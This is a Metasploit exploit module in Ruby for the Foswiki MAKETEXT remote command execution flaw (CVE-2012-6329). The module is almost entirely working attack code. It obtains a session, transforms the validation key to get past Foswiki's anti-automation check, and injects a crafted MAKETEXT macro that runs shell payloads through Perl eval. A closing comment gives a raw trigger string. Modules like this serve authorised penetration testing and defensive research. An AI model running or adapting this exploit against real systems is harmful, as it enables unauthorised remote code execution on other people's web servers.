# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::HttpClient
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Foswiki MAKETEXT Remote Command Execution&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a vulnerability in the MAKETEXT Foswiki variable. By using
                a specially crafted MAKETEXT, a malicious user can execute shell commands since the
                input is passed to the Perl "eval" command without first being sanitized. The
                problem is caused by an underlying security issue in the CPAN:Locale::Maketext
                module.  Only Foswiki sites that have user interface localization enabled
                (UserInterfaceInternationalisation variable set) are vulnerable.
 
                    If USERNAME and PASSWORD aren&#039;t provided, anonymous access will be tried.
                Also, if the FoswikiPage option isn&#039;t provided, the module will try to create a
                random page on the SandBox space. The modules has been tested successfully on
                Foswiki 1.1.5 as distributed with the official Foswiki-1.1.5-vmware image.
            },
            &#039;Author&#039;         =>
                [
                    &#039;Brian Carlson&#039;, # original discovery in Perl Locale::Maketext
                    &#039;juan vazquez&#039; # Metasploit module
                ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;References&#039;     =>
                [
                    [ &#039;CVE&#039;, &#039;2012-6329&#039; ],
                    [ &#039;OSVDB&#039;, &#039;88410&#039; ],
                    [ &#039;URL&#039;, &#039;http://foswiki.org/Support/SecurityAlert-CVE-2012-6330&#039; ]
                ],
            &#039;Privileged&#039;     => false, # web server context
            &#039;Payload&#039;        =>
                {
                    &#039;DisableNops&#039; => true,
                    &#039;Space&#039;       => 1024,
                    &#039;Compat&#039;      =>
                        {
                            &#039;PayloadType&#039; => &#039;cmd&#039;,
                            &#039;RequiredCmd&#039; => &#039;generic ruby python bash telnet&#039;
                        }
                },
            &#039;Platform&#039;       => [ &#039;unix&#039; ],
            &#039;Arch&#039;           => ARCH_CMD,
            &#039;Targets&#039;        => [[ &#039;Foswiki 1.1.5&#039;, { }]],
            &#039;DisclosureDate&#039; => &#039;Dec 03 2012&#039;,
            &#039;DefaultTarget&#039;  => 0))
 
        register_options(
            [
                OptString.new(&#039;TARGETURI&#039;, [ true, "Foswiki base path", "/" ]),
                OptString.new(&#039;FoswikiPage&#039;, [ false, "Foswiki Page with edit permissions to inject the payload, by default random Page on Sandbox (Ex: /Sandbox/MsfTest)" ]),
                OptString.new(&#039;USERNAME&#039;, [ false,  "The user to authenticate as (anonymous if username not provided)"]),
                OptString.new(&#039;PASSWORD&#039;, [ false,  "The password to authenticate with (anonymous if password not provided)" ])
            ], self.class)
    end
 
    def do_login(username, password)
        res = send_request_cgi({
            &#039;method&#039;   => &#039;POST&#039;,
            &#039;uri&#039;      => "#{@base}bin/login",
            &#039;vars_post&#039; =>
                {
                    &#039;username&#039; => username,
                    &#039;password&#039; => password
                }
            })
 
        if not res or res.code != 302 or res.headers[&#039;Set-Cookie&#039;] !~ /FOSWIKISID=([0-9a-f]*)/
            vprint_status "#{res.code}\n#{res.body}"
            return nil
        end
 
        session = $1
        return session
    end
 
    def inject_code(session, code)
 
        vprint_status("Retrieving the validation_key...")
 
        res = send_request_cgi({
            &#039;uri&#039;      => "#{@base}bin/edit#{@page}",
            &#039;cookie&#039;   => "FOSWIKISID=#{session}"
        })
 
        if not res or res.code != 200 or res.body !~ /name=&#039;validation_key&#039; value=&#039;\?([0-9a-f]*)&#039;/
            vprint_error("Error retrieving the validation_key")
            return nil
        end
 
        validation_key = $1
        vprint_good("validation_key found: #{validation_key}")
 
        if session.empty?
            if res.headers[&#039;Set-Cookie&#039;] =~ /FOSWIKISID=([0-9a-f]*)/
                session = $1
            else
                vprint_error("Error using anonymous access")
                return nil
            end
        end
 
        if res.headers[&#039;Set-Cookie&#039;] =~ /FOSWIKISTRIKEONE=([0-9a-f]*)/
            strike_one = $1
        else
            vprint_error("Error getting the FOSWIKISTRIKEONE value")
            return nil
        end
 
        # Transforming validation_key in order to bypass foswiki antiautomation
        validation_key = Rex::Text.md5(validation_key + strike_one)
        vprint_status("Transformed validation key: #{validation_key}")
        vprint_status("Injecting the payload...")
 
        res = send_request_cgi({
            &#039;method&#039;   => &#039;POST&#039;,
            &#039;uri&#039;      => "#{@base}bin/save#{@page}",
            &#039;cookie&#039;   => "FOSWIKISID=#{session}",
            &#039;vars_post&#039; =>
            {
                &#039;validation_key&#039; => validation_key,
                &#039;text&#039; => "#{rand_text_alpha(3 + rand(3))} %MAKETEXT{\"#{rand_text_alpha(3 + rand(3))} [_1] #{rand_text_alpha(3 + rand(3))}\\\\&#039;}; `#{code}`; { #\" args=\"#{rand_text_alpha(3 + rand(3))}\"}%"
            }
 
        })
 
        if not res or res.code != 302 or res.headers[&#039;Location&#039;] !~ /bin\/view#{@page}/
            print_warning("Error injecting the payload")
            print_status "#{res.code}\n#{res.body}\n#{res.headers[&#039;Location&#039;]}"
            return nil
        end
 
        location = URI(res.headers[&#039;Location&#039;]).path
        print_good("Payload injected on #{location}")
 
        return location
    end
 
    def check
        @base = target_uri.path
        @base << &#039;/&#039; if @base[-1, 1] != &#039;/&#039;
 
        res = send_request_cgi({
            &#039;uri&#039;      => "#{@base}System/WebHome"
        })
 
        if not res or res.code != 200
            return Exploit::CheckCode::Unknown
        end
 
        if res.body =~ /This site is running Foswiki version.*Foswiki-(\d\.\d\.\d)/
            version = $1
            print_status("Version found: #{version}")
            if version <= "1.1.6"
                return Exploit::CheckCode::Appears
            else
                return Exploit::CheckCode::Safe
            end
        end
 
        return Exploit::CheckCode::Detected
    end
 
 
    def exploit
 
        # Init variables
        @page = &#039;&#039;
 
        if datastore[&#039;FoswikiPage&#039;] and not datastore[&#039;FoswikiPage&#039;].empty?
            @page << &#039;/&#039; if datastore[&#039;FoswikiPage&#039;][0] != &#039;/&#039;
            @page << datastore[&#039;FoswikiPage&#039;]
        else
            @page << "/Sandbox/#{rand_text_alpha_lower(3).capitalize}#{rand_text_alpha_lower(3).capitalize}"
        end
 
        @base = target_uri.path
        @base << &#039;/&#039; if @base[-1, 1] != &#039;/&#039;
 
        # Login if needed
        if (datastore[&#039;USERNAME&#039;] and
            not datastore[&#039;USERNAME&#039;].empty? and
            datastore[&#039;PASSWORD&#039;] and
            not datastore[&#039;PASSWORD&#039;].empty?)
            print_status("Trying login to get session ID...")
            session = do_login(datastore[&#039;USERNAME&#039;], datastore[&#039;PASSWORD&#039;])
        else
            print_status("Using anonymous access...")
            session = ""
        end
 
        if not session
            fail_with(Exploit::Failure::Unknown, "Error getting a session ID")
        end
 
        # Inject payload
        print_status("Trying to inject the payload on #{@page}...")
        res = inject_code(session, payload.encoded)
        if not res or res !~ /#{@page}/
            fail_with(Exploit::Failure::Unknown, "Error injecting the payload")
        end
 
        # Execute payload
        print_status("Executing the payload through #{@page}...")
        res = send_request_cgi({
            &#039;uri&#039;      => "#{@base}#{@page}",
            &#039;cookie&#039;   => "FOSWIKISID=#{session}"
        })
        if not res or res.code != 200 or res.body !~ /HASH/
            print_status("#{res.code}\n#{res.body}")
            fail_with(Exploit::Failure::Unknown, "Error executing the payload")
        end
 
        print_good("Exploitation was successful")
 
    end
 
end
 
=begin
 
* Trigger:
 
%MAKETEXT{"test [_1] secondtest\\&#039;}; `touch /tmp/msf.txt`; { #" args="msf"}%
 
=end

